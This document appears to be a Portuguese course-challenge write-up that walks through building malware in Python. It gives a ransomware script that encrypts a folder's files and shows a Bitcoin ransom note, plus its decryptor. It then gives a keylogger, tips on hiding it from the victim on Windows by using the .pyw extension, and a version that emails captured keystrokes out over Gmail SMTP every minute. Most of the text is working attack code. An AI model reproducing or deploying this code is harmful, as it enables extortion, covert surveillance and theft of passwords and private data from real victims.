### DESAFIO

## CRIANDO UM RANSOMARE
# CRIPTOGRAFANDO ARQUIVOS

Começamos pela preparação do ambiente simulando, em uma pasta, a existência de 2 (dois) arquivos importantes cujo teor deve ser resguardado.
Na sequência, redigimos o arquivo Python que executará a criptografia/descriptografia dos arquivos atacados.

# ransomware.py
from cryptography.fernet import Fernet
import os

# Gerar uma chave de criptografia e salvá-la em um arquivo
def gerar_chave():
    chave = Fernet.generate_key()
    with open("chave.key", "wb") as chave_file:
        chave_file.write(chave)
    return chave

# Carregar a chave de criptografia de um arquivo
def carregar_chave():
    return open("chave.key", "rb").read()

# Criptografar um arquivo
def criptografar_arquivo(caminho_arquivo, chave):
    fernet = Fernet(chave)
    with open(caminho_arquivo, "rb") as file:
        dados = file.read()
    dados_criptografados = fernet.encrypt(dados)
    with open(caminho_arquivo, "wb") as file:
        file.write(dados_criptografados)

# Encontrar e criptografar todos os arquivos em um diretório
def encontrar_arquivos(diretorio):
    lista = []
    for raiz, _, arquivos in os.walk(diretorio):
        for nome_arquivo in arquivos:
            caminho_completo = os.path.join(raiz, nome_arquivo)
            if nome_arquivo != "ramsonware.py" and not nome_arquivo.endswith(".key"):
                lista.append(caminho_completo)
    return lista

# Mensagem de resgate
def mensagem_resgate():
    print("Seus arquivos foram criptografados!")
    print("Para recuperá-los, envie 1 Bitcoin para o endereço XYZ e entre em contato conosco.")
    print("Aviso: Tentar recuperar os arquivos por conta própria pode resultar na perda permanente dos dados.")

# Executar principal
def main():
    chave = gerar_chave()
    arquivos = encontrar_arquivos("test_files")  # Diretório alvo para criptografia
    for arquivo in arquivos:
        criptografar_arquivo(arquivo, chave)
    mensagem_resgate()
    print("Chave de criptografia salva em 'chave.key'.")

if __name__ == "__main__":
    main()

Executado o script acima, a pasta alvo teve todos seus arquivos criptografados. Sua vida foi desgraçada!






# DESCRIPTOGRAFANDO OS ARQUIVOS ATACADOS
A seguir o script que permitirá a recuperação dos dados originais (sem a criptografia aplicada).

#descriptografar.py
# pip install cryptography

# Iniciar programa de descriptografia
from cryptography.fernet import Fernet
import os

# Carregar a chave de criptografia de um arquivo
def carregar_chave():
    return open("chave.key", "rb").read()

# Descriptografar um arquivo
def descriptografar_arquivo(caminho_arquivo, chave):
    fernet = Fernet(chave)
    with open(caminho_arquivo, "rb") as file:
        dados_criptografados = file.read()
        dados_descriptografados = fernet.decrypt(dados_criptografados)
    with open(caminho_arquivo, "wb") as file:
        file.write(dados_descriptografados)

# Encontrar e descriptografar todos os arquivos em um diretório
def encontrar_arquivos(diretorio):
    lista = []
    for raiz, _, arquivos in os.walk(diretorio):
        for nome_arquivo in arquivos:
            caminho_completo = os.path.join(raiz, nome_arquivo)
            if nome_arquivo != "descriptografar.py" and not nome_arquivo.endswith(".key"):
                lista.append(caminho_completo)
    return lista

# Executar principal
def main():
    chave = carregar_chave()
    arquivos = encontrar_arquivos("test_files")  # Diretório alvo para descriptografia
    for arquivo in arquivos:
        descriptografar_arquivo(arquivo, chave)
    print("Todos os arquivos foram descriptografados com sucesso.")

if __name__ == "__main__":
    main()


## CRIANDO UM KEYLLOGER

A função desse malware é o monitoramento e registro de todas as entradas de dados via teclado. Tudo que é digitado é capturado e enviado ao agente mal intencionado que poderá fazer diversos usos indevidos (criminosos e danosos) com tais dados.
Preparando o ambiente, criamos uma nova pasta com a instalação da biblioteca Pynput (pip install pynput) que tem a finalidade de “permite controlar e monitorar dispositivos de entrada” (mouse/teclado) de sua máquina.

Esquema de uso:
1 - Vai ficar em execução em segundo plano;
2 -  Toda vez que o usuário digitar uma tecla, o programa vai capturar essa tecla;
3 – O que for digitado, será gravado num arquivo “.txt”; e
4 -  O arquivo vai mostrar tudo o que foi digitado, de forma sequencial.

# keylloger.py
# pip install pynput

from pynput import keyboard

IGNORAR = {

    keyboard.Key.shift,
    keyboard.Key.shift_r,
    keyboard.Key.ctrl_l,
    keyboard.Key.ctrl_r,
    keyboard.Key.alt_l,
    keyboard.Key.alt_r,
    keyboard.Key.caps_lock,
    keyboard.Key.tab,
    keyboard.Key.cmd,
    keyboard.Key.backspace,
    keyboard.Key.esc,
    keyboard.Key.enter
}

def on_press(key):
    if key not in IGNORAR:
        try:
            with open("log.txt", "a") as f:
                f.write(key.char)
        except AttributeError:
            with open("log.txt", "a") as f:
                f.write(f" {key} ")

with keyboard.Listener(on_press=on_press) as listener:
    listener.join()

Rodando o script pudemos capturar os dados que foram digitados no teclado e registramos esses no respectivo arquivo de logs para posterior consulta e uso.


## TORNANDO UM KEYLLOGER “INVISÍVEL À VÍTIMA.

Nesta etapa iniciamos com um simples movimento: a mudança da extensão do nosso script de “.py” para “.pyw”. Esta ação ativa uma funcionalidade nativa do Python, atenção!!, no Windows. Essa mudança permite que o script rode em “background” no sistema Windows, sem ser notado.


## ENVIANDO OS DADOS CAPTURADOS REMOTAMENTE

Inicialmente é preciso de uma conta exclusiva para testes, por questões de segurança. Esta conta será utilizada no teste e deve ser ativada a verificação em 2 (duas) etapas.
O script a seguir realiza a automação do envio de mensagens periódicas ao atacante com os dados coletados de tempo em tempo.

from pynput import keyboard
import smtplib
from email.mime.text import MIMEText
from threading import Timer

log = ''

# CONFIGURAÇÕES DE E-MAIL
EMAIL_ORIGEM = 'tecno21desafio@gmail.com'
EMAIL_DESTINO = 'tecno21desafio@gmail.com'
SENHA_EMAIL = ''


def enviar_email():
	global log
	if log:
		msg = MIMEText(log)
		msg['SUBJECT'] = 'Dados capturados pelo Keylogger'
		msg['FROM'] = EMAIL_ORIGEM
		msg['To'] = EMAIL_DESTINO

	try:
		server = smtplib.SMTP('smtp.gmail.com', 587)
		server.starttls()
		server.login(EMAIL_ORIGEM, SENHA_EMAIL)
		server.send_message(msg)
		server.quit()
	except Exception as e:
		print('Erro ao enviar!', e)
	log = ''

	# Agendar o envio a cada 60 segundos.
	Timer(60, enviar_email).start()


def on_press(key):
	global log
	try:
		log += key.char

	except AttributeError:
		if key == keyboard.Key.space:
			log += ' '
		elif key == keyboard.Key.enter:
			log += '\n'
		elif key == keyboard.Key.backspace:
			log += '[<]'
		else:
			... # Ignora 'Ctrl', 'shift', etc.


# Inicia o Keylogger e o envio automático.

with keyboard.Listener(on_press=on_press) as listener:
	enviar_email()
	listener.join()

